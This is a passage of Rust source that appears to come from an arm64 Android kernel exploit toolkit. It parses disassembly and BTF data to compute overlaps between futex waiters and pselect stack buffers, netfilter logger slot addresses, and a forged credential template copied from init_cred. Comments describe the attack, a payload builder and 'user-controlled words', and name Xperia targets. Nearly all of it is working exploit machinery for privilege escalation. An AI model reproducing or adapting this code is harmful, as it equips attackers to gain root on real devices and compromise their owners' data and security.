    let wake_state = btf.and_then(|btf| btf.field("rt_mutex_waiter", "wake_state"));
    let (pi_tree, wake_state) = waiter_layout_fields(pi_tree, wake_state);
    if pi_tree == 0 && wake_state == 0 {
        eprintln!(
            "info: rt_mutex_waiter pi_tree/wake_state missing or incomplete; seeding the \
             waiter local from the rt_mutex_init_waiter argument and the zero store"
        );
    }

    let mut waiter_candidates: Vec<(String, u64)> = Vec::new();
    // A waiter local sourced from the rt_mutex_init_waiter argument is already
    // validated by that call, so it bypasses the self-store filter below.
    let mut from_init_call: BTreeSet<u64> = BTreeSet::new();
    if pi_tree == 0 && wake_state == 0 {
        from_init_call = waiter_locals_from_init_call(&dis["futex_wait"], symbols);
        for local in &from_init_call {
            waiter_candidates.push(("x0".to_string(), *local));
        }
    }
    for (reg, imm) in add_sp_immediates(&dis["futex_wait"]) {
        if pi_tree != 0 {
            let re =
                Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree:x}\b")).unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        } else {
            let re =
                Regex::new(&format!(r"(?i)\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]")).unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        }
    }
    // Several registers may materialize the same sp local; dedupe by offset.
    let mut seen = BTreeSet::new();
    waiter_candidates.retain(|(_, imm)| seen.insert(*imm));
    if waiter_candidates.len() != 1 {
        // Other locals take a +pi_tree sized add too, so keep only candidates
        // that self-store their base, and store a wake_state when there is one.
        let lines = &dis["futex_wait"];
        waiter_candidates.retain(|(reg, imm)| {
            if from_init_call.contains(imm) {
                return true;
            }
            let self_store = lines.iter().any(|line| {
                Regex::new(&format!(r"(?i)\bstr\s+{reg},\s*\[sp,\s*#0x{imm:x}\]"))
                    .unwrap()
                    .is_match(line)
            });
            let wake_store = wake_state != 0
                && lines.iter().any(|line| {
                    Regex::new(&format!(
                        r"(?i)\bstr\s+w\d+,\s*\[sp,\s*#0x{:x}\]",
                        imm + wake_state
                    ))
                    .unwrap()
                    .is_match(line)
                });
            self_store || wake_store
        });
    }
    if waiter_candidates.len() != 1 {
        return Err(ExtractError::new(format!(
            "futex waiter stack local not unique: {waiter_candidates:?}"
        )));
    }
    let (waiter_reg, waiter_local) = &waiter_candidates[0];
    let anchor = Regex::new(&format!(
        r"(?i)\badd\s+{waiter_reg},\s*sp,\s*#0x{waiter_local:x}\b"
    ))
    .unwrap();
    validate_frame_live_at(&dis["futex_wait"], &anchor, "futex_wait")?;

    let mut required_fields = vec![*waiter_local];
    if wake_state != 0 {
        required_fields.push(waiter_local + wake_state);
    }
    for required in required_fields {
        let re = Regex::new(&format!(r"(?i)\[sp,\s*#0x{required:x}\]")).unwrap();
        if !dis["futex_wait"].iter().any(|line| re.is_match(line)) {
            return Err(ExtractError::new(format!(
                "futex waiter candidate 0x{waiter_local:x} not cross-validated \
                 by a real field store at 0x{required:x}"
            )));
        }
    }

    let add_sp = add_sp_immediates(&dis["pselect_core"]);
    let mut buffer_candidates: BTreeSet<u64> = BTreeSet::new();
    for (reg, imm) in &add_sp {
        let peers: Vec<&str> = add_sp
            .iter()
            .filter(|(peer, peer_imm)| peer_imm == imm && peer != reg)
            .map(|(peer, _)| peer.as_str())
            .collect();
        let any_cmp = peers.iter().any(|peer| {
            let re = Regex::new(&format!(r"(?i)\bcmp\s+{reg},\s*{peer}\b")).unwrap();
            let re2 = Regex::new(&format!(r"(?i)\bcmp\s+{peer},\s*{reg}\b")).unwrap();
            dis["pselect_core"]
                .iter()
                .any(|line| re.is_match(line) || re2.is_match(line))
        });
        if any_cmp {
            buffer_candidates.insert(*imm);
        }
    }
    if buffer_candidates.len() != 1 {
        let hex: Vec<String> = buffer_candidates
            .iter()
            .map(|v| format!("{v:#x}"))
            .collect();
        return Err(ExtractError::new(format!(
            "core_sys_select fd_set buffer candidates not unique: {hex:?}"
        )));
    }
    let pselect_buffer = *buffer_candidates.iter().next().unwrap();
    let buffer_regs: BTreeSet<String> = add_sp
        .iter()
        .filter(|(_, imm)| *imm == pselect_buffer)
        .map(|(reg, _)| reg.clone())
        .collect();
    if buffer_regs.is_empty() {
        return Err(ExtractError::new(
            "core_sys_select stack buffer has no output register",
        ));
    }
    let buffer_regs: Vec<String> = buffer_regs.into_iter().collect();
    for buffer_reg in &buffer_regs {
        let anchor = Regex::new(&format!(
            r"(?i)\badd\s+{buffer_reg},\s*sp,\s*#0x{pselect_buffer:x}\b"
        ))
        .unwrap();
        validate_frame_live_at(
            &dis["pselect_core"],
            &anchor,
            &format!("core_sys_select/{buffer_reg}"),
        )?;
    }

    let fds_bytes = ((route_nfds + 63) / 64) * 8;
    let thresholds = cmp_immediates(&dis["pselect_core"]);
    if !thresholds
        .iter()
        .any(|threshold| fds_bytes < *threshold && *threshold <= fds_bytes + 8)
    {
        return Err(ExtractError::new(format!(
            "core_sys_select threshold does not prove route_nfds={route_nfds} \
             uses the stack fd_set path"
        )));
    }

    let frame_sum: u64 = pselect_chain
        .iter()
        .map(|key| frames[&format!("frame_{key}")])
        .sum();
    let pselect_word0 = -(frame_sum as i64) + pselect_buffer as i64;
    let futex_sum: u64 = futex_chain
        .iter()
        .map(|key| frames[&format!("frame_{key}")])
        .sum();
    let futex_waiter = -(futex_sum as i64) + *waiter_local as i64;
    let delta = futex_waiter - pselect_word0;
    if delta < 0 || delta % 8 != 0 {
        return Err(ExtractError::new(format!(
            "pselect/futex overlap is not a non-negative qword: {delta}"
        )));
    }
    let shift = (delta / 8) as u64;
    if shift > 16 {
        return Err(ExtractError::infeasible(format!(
            "PSELECT_WAITER_WORD_SHIFT too large: {shift}"
        )));
    }
    if shift > 3 {
        return Err(ExtractError::infeasible(format!(
            "futex waiter starts {shift} qwords above the fd_set buffer; \
             task/lock would land outside the user-controlled words 0..14 \
             (max feasible shift is 3)"
        )));
    }
    if shift == 3 {
        eprintln!(
            "warning: waiter fits at the last usable word (shift=3); \
             wake_state falls outside the copied fd_set and relies on the \
             kernel zero-initialising it"
        );
    }
    let chain = pselect_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    let futex_chain_str = futex_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    Ok(PselectLayout {
        shift,
        waiter_local: *waiter_local,
        pselect_word0,
        futex_waiter,
        pselect_buffer,
        chain,
        futex_chain: futex_chain_str,
        frames,
    })
}

fn u32_at(data: &[u8], off: u64) -> Result<u32> {
    let off = off as usize;
    if off + 4 > data.len() {
        return Err(ExtractError::new(format!(
            "u32 read out of range: 0x{off:x}"
        )));
    }
    Ok(u32::from_le_bytes(data[off..off + 4].try_into().unwrap()))
}

pub struct NfLoggerInfo {
    pub loggers: u64,
    pub nfulnl_logger: u64,
    pub loggers_0_1: u64,
    pub nf_log_type_ulog: i64,
}

/// Derive loggers[0][NF_LOG_TYPE_ULOG] by disassembling nf_log_register /
/// nfnetlink_log_init and closing the slot index against BTF.
pub fn derive_nf_logger_registration(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: &Btf,
) -> Result<NfLoggerInfo> {
    let register_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nf_log_register", 0x800)?;
    let init_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nfnetlink_log_init", 0x800)?;
    let logger = unique_offset(symbols, "nfulnl_logger")?;
    let loggers = unique_offset(symbols, "loggers")?;
    let type_off = btf
        .field("nf_logger", "type")
        .ok_or_else(|| ExtractError::new("BTF nf_logger.type missing"))?;
    if btf.direct_field_size("nf_logger", "type") != Some(4) {
        return Err(ExtractError::new("BTF nf_logger.type is not a 4-byte enum"));
    }
    let logger_type = u32_at(kernel, logger + type_off as u64)?;
    let ulog_value = btf
        .enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_ULOG missing"))?;
    let max_value = btf
        .enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_MAX missing"))?;
    let nfproto_unspec = btf
        .unique_enum_member_value("NFPROTO_UNSPEC")
        .ok_or_else(|| ExtractError::new("BTF NFPROTO_UNSPEC missing"))?;
    if logger_type as i64 != ulog_value || !(0 <= ulog_value && ulog_value < max_value) {
        return Err(ExtractError::new(format!(
            "nfulnl_logger.type does not close with BTF NF_LOG_TYPE_ULOG: \
             data={logger_type}, ulog={ulog_value}, max={max_value}"
        )));
    }

    let logger_aliases: BTreeSet<String> = register_text
        .iter()
        .filter_map(|line| is_mov_x1(line))
        .collect();
    if logger_aliases.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register logger alias not unique: {logger_aliases:?}"
        )));
    }
    let logger_reg = logger_aliases.iter().next().unwrap().clone();
    let type_load_re = Regex::new(&format!(
        r"(?i)\bldr\s+w(\d+),\s*\[{logger_reg},\s*#0x{type_off:x}\]"
    ))
    .unwrap();
    let mut type_loads: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in type_load_re.captures_iter(line) {
            type_loads.insert(caps[1].to_string());
        }
    }
    if type_loads.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register type load not unique: {type_loads:?}"
        )));
    }
    let type_reg = type_loads.iter().next().unwrap().clone();
    let adrp_re = Regex::new(r"(?i)\badrp\s+(x\d+),").unwrap();
    let mut base_regs: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in adrp_re.captures_iter(line) {
            let reg = caps[1].to_ascii_lowercase();
            if materialized_address(&register_text, &reg, loggers) {
                base_regs.insert(reg);
            }
        }
    }
    let mut indexed: Vec<(String, String)> = Vec::new();
    for base_reg in &base_regs {
        let lsl4_re = Regex::new(&format!(
            r"(?i)\badd\s+(x\d+),\s*{base_reg},\s*(x\d+),\s*lsl\s*#4"
        ))
        .unwrap();
        for line in &register_text {
            for caps in lsl4_re.captures_iter(line) {
                let destination = caps[1].to_ascii_lowercase();
                let pf_reg = caps[2].to_ascii_lowercase();
                let lsl3_re = Regex::new(&format!(
                    r"(?i)\badd\s+{destination},\s*{destination},\s*x{type_reg},\s*lsl\s*#3"
                ))
                .unwrap();
                if register_text.iter().any(|l| lsl3_re.is_match(l)) {
                    indexed.push((destination, pf_reg));
                }
            }
        }
    }
    let mut deduped: Vec<(String, String)> = Vec::new();
    for entry in indexed {
        if !deduped.contains(&entry) {
            deduped.push(entry);
        }
    }
    if deduped.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register loggers[pf][type] dataflow not unique: {deduped:?}"
        )));
    }
    let (slot_reg, _) = &deduped[0];
    let stlr_re = Regex::new(&format!(r"(?i)\bstlr\s+{logger_reg},\s*\[{slot_reg}\]")).unwrap();
    if !register_text.iter().any(|line| stlr_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register does not store the logger to the slot",
        ));
    }
    let bound_re = Regex::new(&format!(r"(?i)\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b")).unwrap();
    if !register_text.iter().any(|line| bound_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register type bound not closed with NF_LOG_TYPE_MAX",
        ));
    }

    let target = unique_offset(symbols, "nf_log_register")?;
    let call_re = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
    let calls: Vec<usize> = init_text
        .iter()
        .enumerate()
        .filter(|(_, line)| call_re.is_match(line))
        .map(|(index, _)| index)
        .collect();
    if calls.len() != 1 {
        return Err(ExtractError::new(format!(
            "nfnetlink_log_init -> nf_log_register calls: {}",
            calls.len()
        )));
    }
    let start = calls[0].saturating_sub(6);
    let call_window: Vec<String> = init_text[start..calls[0]].to_vec();
    if nfproto_unspec != 0 || !call_window.iter().any(|line| is_mov_w0_wzr(line)) {
        return Err(ExtractError::new(
            "nfnetlink_log_init does not register with NFPROTO_UNSPEC(0)",
        ));
    }
    if !materialized_address(&init_text, "x1", logger) {
        return Err(ExtractError::new(
            "nfnetlink_log_init x1 does not materialize nfulnl_logger",
        ));
    }
    let slot = loggers + ulog_value as u64 * 8;
    Ok(NfLoggerInfo {
        loggers,
        nfulnl_logger: logger,
        loggers_0_1: slot,
        nf_log_type_ulog: ulog_value,
    })
}

/* ------------------------------------------------------------------------- */
/* 5.x credential template and multicast geometry                            */
/* ------------------------------------------------------------------------- */

/// The attack raises the usage count on the socket-pinned private copy; this is
/// a route constant, not the image's `usage` value.
pub const CRED_5X_USAGE_VALUE: u64 = 256;

/// The proven 5.x multicast layout constants: `waiter_off` comes from the IPv4
/// UDP `MCAST_BLOCK_SOURCE` probe.
pub const MULTICAST_5X_WAITER_OFF: i64 = 96;
pub const MULTICAST_5X_BUFFER_SIZE: i64 = 264;

/// Fields read from the real `init_cred`; the payload builder fills a private
/// credential copy with them (`support/util.cpp::fill_profile_cred_copy`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Cred5x {
    pub caps_offset: u32,
    pub caps_count: u32,
    pub caps_value: u64,
    /// `(offset, image VA)` per reference slot, sorted by offset.
    pub refs: Vec<(u32, u64)>,
}

/// Picks the capability run from the 8-byte slots in `caps_start..caps_end`:
/// the first non-zero slot starts the run, which continues while the slots
/// equal that value. The historical template selected `cap_permitted` through
/// `cap_bset` this way (`0x30/0x38/0x40` on the Xperia `init_cred`).
pub fn select_cred_caps(
    read: impl Fn(u32) -> Option<u64>,
    caps_start: u32,
    caps_end: u32,
) -> Option<(u32, u32, u64)> {
    let mut offset = None;
    let mut value = 0u64;
    let mut count = 0u32;
    let mut cursor = caps_start;
    while cursor + 8 <= caps_end {
        let Some(slot) = read(cursor) else { break };
        if offset.is_none() {
            if slot != 0 {
                offset = Some(cursor);
                value = slot;
                count = 1;
            }
        } else if slot == value {
            count += 1;
        } else {
            break;
        }
        cursor += 8;
    }
    offset.map(|offset| (offset, count, value))
}

/// Canonical arm64 kernel VA: the top 16 bits are set. Image pointers in
/// `init_cred` are pre-KASLR canonical addresses and must be relocated.
fn is_kernel_va(value: u64) -> bool {
    value >> 48 == 0xffff
}

/// Selects the reference slots from the cred pointer members: non-zero
/// canonical image VAs, in offset order. The Xperia `init_cred` yields exactly
/// the four slots at `0x80/0x88/0x90/0x98`.
pub fn select_cred_refs(slots: &[(u32, u64)]) -> Vec<(u32, u64)> {
    let mut refs: Vec<(u32, u64)> = slots
        .iter()
        .copied()
        .filter(|(_, value)| *value != 0 && is_kernel_va(*value))
        .collect();
    refs.sort_by_key(|(offset, _)| *offset);
    refs.dedup_by_key(|(offset, _)| *offset);
    refs
}

/// Derives the 5.x credential template: BTF gives the layout, the image's
/// `init_cred` gives the values. `init_cred_off` is the image offset
/// (`kallsyms init_cred - _text`).
pub fn derive_cred_5x(btf: &Btf, kernel: &[u8], init_cred_off: u64) -> Result<Cred5x> {
    let size = btf
        .size("cred")
        .ok_or_else(|| ExtractError::new("cred type is missing from BTF"))?;
    let start = init_cred_off as usize;
    let end = start
        .checked_add(size as usize)
        .ok_or_else(|| ExtractError::new("init_cred offset overflows"))?;
    let bytes = kernel
        .get(start..end)
        .ok_or_else(|| ExtractError::new("init_cred is outside the kernel image"))?;
    let read = |offset: u32| -> Option<u64> {
        let offset = offset as usize;
        if offset + 8 > bytes.len() {
            return None;
        }
        Some(u64::from_le_bytes(
            bytes[offset..offset + 8].try_into().ok()?,
        ))
    };

    let caps_start = btf
        .field("cred", "cap_inheritable")
        .ok_or_else(|| ExtractError::new("cred.cap_inheritable is missing from BTF"))?;
    let caps_end = btf
        .field("cred", "cap_ambient")
        .map(|offset| offset + 8)
        .unwrap_or(caps_start + 5 * 8)
        .min(size);
    let (caps_offset, caps_count, caps_value) = select_cred_caps(read, caps_start, caps_end)
        .ok_or_else(|| ExtractError::new("no non-zero capability run in init_cred"))?;

    let cred = btf
        .named_struct("cred")
        .ok_or_else(|| ExtractError::new("cred type is missing from BTF"))?;
    let slots: Vec<(u32, u64)> = cred
        .members
        .iter()
        .filter_map(|member| {
            if member.bit_offset % 8 != 0 {
                return None;
            }
            let resolved = btf.resolve(member.type_id)?;
            if resolved.kind != crate::btf::KIND_PTR {
                return None;
            }
            let offset = member.bit_offset / 8;
            if offset + 8 > size {
                return None;
            }
            read(offset).map(|value| (offset, value))
        })
        .collect();
    let refs = select_cred_refs(&slots);
    if refs.is_empty() {
        return Err(ExtractError::new(
            "no reference pointers found in init_cred",
        ));
    }
    if refs.len() > 4 {
        return Err(ExtractError::new(format!(
            "init_cred has {} reference pointers; the template holds 4",
            refs.len()
        )));
    }

    Ok(Cred5x {
        caps_offset,
        caps_count,
        caps_value,
        refs,
    })
}

/// `sizeof(struct cred)` on the android12-5.10 arm64 layout.
pub const CRED_5X_SIZE: u32 = 168;
const CRED_5X_CAPS_START: u32 = 40;
const CRED_5X_CAPS_END: u32 = 72;
const CRED_5X_REF_OFFSETS: [u32; 3] = [0x80, 0x88, 0x90];

/// Derives the [`derive_cred_5x`] template from the image's `init_cred` and the
/// android12-5.10 `cred` layout. `size` is the `init_groups - init_cred` gap,
/// or [`CRED_5X_SIZE`].
pub fn derive_cred_5x_without_btf(
    kernel: &[u8],
    init_cred_off: u64,
    size: u32,
) -> Result<Cred5x> {
    let start = init_cred_off as usize;
    let end = start
        .checked_add(size as usize)
        .ok_or_else(|| ExtractError::new("init_cred offset overflows"))?;
    let bytes = kernel
        .get(start..end)
        .ok_or_else(|| ExtractError::new("init_cred is outside the kernel image"))?;
    let read = |offset: u32| -> Option<u64> {
        let offset = offset as usize;
        if offset + 8 > bytes.len() {
            return None;
        }
        Some(u64::from_le_bytes(
            bytes[offset..offset + 8].try_into().ok()?,
        ))
    };

    let (caps_offset, caps_count, caps_value) =
        select_cred_caps(read, CRED_5X_CAPS_START, CRED_5X_CAPS_END)
            .ok_or_else(|| ExtractError::new("no non-zero capability run in init_cred"))?;

    let slots: Vec<(u32, u64)> = CRED_5X_REF_OFFSETS
        .iter()
        .filter_map(|offset| read(*offset).map(|value| (*offset, value)))
        .collect();
    let refs = select_cred_refs(&slots);
    if refs.is_empty() {
        return Err(ExtractError::new(
            "no reference pointers found in init_cred",
        ));
    }

    Ok(Cred5x {
        caps_offset,
        caps_count,
        caps_value,
        refs,
    })
}

/// The train-corroborated 5.x multicast geometry: the frame/copy-window fields
/// (`waiter_off`, `buffer_size`), the BTF-derived `rt_mutex_waiter` field
/// offsets, and the compact-waiter flag. These hold across devices on the same
/// train. A missing BTF value omits that key so the built-in profile can
/// supply it.
pub fn multicast_geometry_corroborated(
    structs: &BTreeMap<String, Option<u32>>,
) -> Vec<(&'static str, i64)> {
    let mut geometry: Vec<(&'static str, i64)> = vec![
        ("waiter_off", MULTICAST_5X_WAITER_OFF),
        ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
    ];
    geometry.extend(multicast_waiter_field_offsets(structs));
    geometry.push(("compact_waiter", 1));
    geometry
}

fn multicast_waiter_field_offsets(
    structs: &BTreeMap<String, Option<u32>>,
) -> Vec<(&'static str, i64)> {
    let mut geometry: Vec<(&'static str, i64)> = Vec::new();
    if let Some(task) = structs.get("waiter_task").copied().flatten() {
        geometry.push(("task_offset", i64::from(task)));
    }
    if let Some(lock) = structs.get("waiter_lock").copied().flatten() {
        geometry.push(("lock_offset", i64::from(lock)));
    }
    geometry
}

/// Full 5.x multicast geometry for the exact validated release. The forged
/// object placement is no longer emitted (resident writer removed), so the
/// geometry equals the train-corroborated set.
pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
    multicast_geometry_corroborated(structs)
}

/// BTF-only part of the 5.x multicast geometry for releases with no verified
/// layout evidence: only what the image itself provides (`rt_mutex_waiter.task`
/// / `.lock`). The proven Xperia constants are omitted on purpose so they are
/// not mistaken for image-derived values.
pub fn multicast_geometry_btf_only(
    structs: &BTreeMap<String, Option<u32>>,
) -> Vec<(&'static str, i64)> {
    let mut geometry: Vec<(&'static str, i64)> = Vec::new();
    if let Some(task) = structs.get("waiter_task").copied().flatten() {
        geometry.push(("task_offset", i64::from(task)));
    }
    if let Some(lock) = structs.get("waiter_lock").copied().flatten() {
        geometry.push(("lock_offset", i64::from(lock)));
    }
    geometry
}
